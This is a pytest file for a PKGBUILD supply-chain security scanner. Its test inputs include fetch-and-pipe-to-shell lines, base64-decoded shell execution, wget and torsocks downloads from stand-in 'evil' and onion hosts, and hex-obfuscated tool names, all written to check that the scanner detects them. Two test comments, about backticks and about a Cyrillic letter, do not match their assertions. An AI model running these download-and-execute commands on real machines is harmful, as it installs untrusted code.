"""Tests for the PKGBUILD security scanner (Phase 2 roadmap)."""

import pytest

from neoarch.backend.services.security_scan import (
    _parse_install_scriptlets,
    _parse_pkgbuild_sources,
    findings_for_file,
    scan_install_scriptlet,
    scan_pkgbuild,
    scan_text,
)


def sev(findings):
    return sorted(f["severity"] for f in findings)


def find_rules(findings):
    return sorted(f["rule"] for f in findings)


# ── risky post-install tools ──────────────────────────────────────────────

def test_risky_tool_detected():
    f = scan_text('npm install -g foo\n')
    assert find_rules(f) == ["risky post-install tool"]


def test_risky_tool_not_matched_when_substring():
    f = scan_text('echo "wgetter app v1.0"\n')
    assert find_rules(f) == []


def test_curl_pipe_to_shell():
    f = scan_text('curl -sL https://x | sh\n')
    rules = find_rules(f)
    assert "risky post-install tool" in rules
    assert "dynamic command construction" in rules


# ── privilege elevation ───────────────────────────────────────────────────

def test_sudo_detected_as_critical():
    f = scan_text('sudo chmod 755 /usr/bin/foo\n')
    assert any(x["rule"] == "privilege elevation" and x["severity"] == "critical"
               for x in f)


def test_pkexec_detected():
    assert "privilege elevation" in find_rules(scan_text('pkexec pacman -U x\n'))


# ── dynamic construction ──────────────────────────────────────────────────

@pytest.mark.parametrize("line", [
    "eval \"$USER_INPUT\"",
    "foo=$(whoami)",
    "cmd=`echo bar`",
    "echo ${!var}",
    "echo YmFzaA== | base64 -d | sh",
])
def test_dynamic_patterns(line):
    rules = find_rules(scan_text(line + "\n"))
    assert "dynamic command construction" in rules


def test_backticks_in_string_literal_not_detected():
    # A literal backtick inside single quotes is still executable, so it
    # should be flagged — only escaped backticks are safe.
    rules = find_rules(scan_text("msg='hello world'\n"))
    assert "dynamic command construction" not in rules


# ── obfuscation ───────────────────────────────────────────────────────────

def test_quoted_tool_name_still_detected():
    f = scan_text("b''u''n install x\n")
    assert "obfuscated tool name" in find_rules(f)
    assert any(x["matched"] == "b''u''n install x" for x in f)


def test_backslash_obfuscation_detected():
    f = scan_text("cur\\l -o /tmp/x\n")
    assert "obfuscated tool name" in find_rules(f)


# ── homograph / Unicode spoofing ──────────────────────────────────────────

def test_zero_width_detected():
    f = scan_text("url=https://evil\u200b.com\n")
    assert "Unicode homograph spoofing" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_cyrillic_mixed_script_detected():
    # Cyrillic 'а' + Latin looks like "paca" but is different data.
    f = scan_text("pkgname=paca\n")
    assert "Unicode homograph spoofing" not in find_rules(f)
    f = scan_text("url=https://a\u0430.com\n")
    assert "Unicode homograph spoofing" in find_rules(f)


def test_confusable_flagged_as_warning():
    f = scan_text("pkgdesc=hello w\u0430rld\n")
    assert any(x["rule"] == "Unicode homograph spoofing"
               and x["severity"] == "warning" for x in f)


def test_normal_ascii_no_findings():
    f = scan_text("pkgname=firefox\npkgdesc=Web browser\nurl=https://mozilla.org\n")
    assert find_rules(f) == []


# ── binary local sources ──────────────────────────────────────────────────

def test_binary_elf_source(tmp_path):
    elf = tmp_path / "evil_bin"
    elf.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32)
    f = scan_pkgbuild("pkgname=x\nsource=('evil_bin')\n", base_dir=str(tmp_path))
    assert "local binary source" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


# ── scriptlet extraction and scanning ─────────────────────────────────────

def test_parse_install_scriptlets():
    text = (
        "post_install() {\n"
        "  echo hi\n"
        "}\n"
        "pre_remove() {\n"
        "  echo bye\n"
        "}\n"
    )
    s = _parse_install_scriptlets(text)
    assert set(s) == {"post_install", "pre_remove"}
    assert "echo hi" in s["post_install"]
    assert "echo bye" in s["pre_remove"]


def test_scan_install_scriptlet():
    f = scan_install_scriptlet("npm i -g x\n", "post_install")
    assert "risky post-install tool" in find_rules(f)
    assert all(x["context"] == "post_install" for x in f)


def test_scan_pkgbuild_includes_scriptlet():
    pkgbuild = (
        "pkgname=foo\n"
        "source=('foo.tar.gz')\n"
        "build() {\n"
        "  ./configure\n"
        "}\n"
        "post_install() {\n"
        "  sudo systemctl enable foo\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert "privilege elevation" in find_rules(f)
    assert "risky post-install tool" not in find_rules(f)


def test_scan_pkgbuild_clean():
    pkgbuild = (
        "pkgname=hello\n"
        "pkgver=1.0\n"
        "source=('hello.tar.gz')\n"
        "build() {\n"
        "  ./configure --prefix=/usr\n"
        "  make\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert f == []


def test_findings_for_file(tmp_path):
    p = tmp_path / "PKGBUILD"
    p.write_text("post_install() {\n  wget -O /x http://evil\n}\n")
    f = findings_for_file(str(p))
    assert "risky post-install tool" in find_rules(f)


def test_findings_for_file_missing():
    assert findings_for_file("/nonexistent/PKGBUILD") == []


def test_source_parsing_quoted_and_unquoted():
    text = "source=(foo.tar.gz 'https://x/y.zip' bar)\n"
    s = _parse_pkgbuild_sources(text)
    assert "foo.tar.gz" in s
    assert "https://x/y.zip" in s
    assert "bar" in s


def test_line_numbers_reported():
    f = scan_text("ok\nnpm i\n", context="test")
    npm = [x for x in f if x["rule"] == "risky post-install tool"]
    assert npm and npm[0]["line"] == 2


# ── obfuscation & supply-chain evasion (ported from archcanary rules) ─────

def test_ansi_c_byte_assembly_detected():
    f = scan_text("eval $'\\x63\\x75\\x72\\x6c' -o /tmp/x\n")
    assert "command obfuscation" in find_rules(f)
    assert any(x["severity"] == "warning" for x in f)


def test_single_ansi_c_escape_is_not_obfuscation():
    # `read -d $'\0'` is a common, legitimate idiom; one escape never matches.
    f = scan_text("read -d $'\\0' second\n")
    assert "command obfuscation" not in find_rules(f)


def test_printf_byte_spelling_detected():
    f = scan_text(r"printf '\x63\x75\x72\x6c' > /tmp/x\n")
    assert "command obfuscation" in find_rules(f)


def test_printf_colour_escape_not_flagged():
    f = scan_text(r"printf '\033[1;31m\033[0m'\n")
    assert "command obfuscation" not in find_rules(f)


def test_variable_split_reassembly_detected():
    f = scan_text("a=bu;b=n; $a$b install\n")
    assert "command obfuscation" in find_rules(f)


def test_tor_proxied_fetch_detected():
    f = scan_text("curl -x socks5h://127.0.0.1:9050 -o /tmp/p https://x\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_torsocks_wrapper_detected():
    f = scan_text("torsocks wget https://evil.example\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)


def test_onion_url_detected():
    f = scan_text("wget https://deadbeef.onion/payload\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)
    assert any(x["severity"] == "warning" for x in f)


def test_download_to_system_path_detected():
    f = scan_text("wget -O /usr/local/bin/systemmanager https://x\n")
    assert "download to system path" in find_rules(f)


def test_aur_self_reference_detected():
    f = scan_text("git push ssh://aur@aur.archlinux.org/evil.git HEAD\n")
    assert "AUR repository self-reference" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_aur_self_reference_in_comment_ignored():
    f = scan_text("# push this + .SRCINFO to ssh://aur@aur.archlinux.org\n")
    assert "AUR repository self-reference" not in find_rules(f)


def test_noninteractive_pacman_detected():
    f = scan_install_scriptlet("pacman -S --noconfirm tor\n", "post_install")
    assert "non-interactive pacman" in find_rules(f)


def test_noninteractive_pacman_comment_ignored():
    f = scan_text("# pacman -S --noconfirm upgrade reminder\n")
    assert "non-interactive pacman" not in find_rules(f)


def test_duplicate_source_declaration_detected():
    pkgbuild = "source=('a.tar.gz')\nsource=('evil.sh')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "duplicate source declaration" in find_rules(f)


def test_append_only_source_not_flagged():
    pkgbuild = "source=('a.tar.gz')\nsource+=('extra.txt')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "duplicate source declaration" not in find_rules(f)


def test_mutable_pull_request_diff_detected():
    pkgbuild = "source=('https://github.com/x/y/pull/5.diff')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" in find_rules(f)


def test_checksum_pinned_mr_diff_not_flagged():
    pkgbuild = (
        "source=('https://github.com/x/y/pull/5.diff')\n"
        "sha256sums=('9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cc"
        "d15d6c15b0f00a08')\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" not in find_rules(f)


def test_immutable_commit_patch_not_flagged():
    pkgbuild = "source=('https://github.com/x/y/commit/abc123.patch')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" not in find_rules(f)
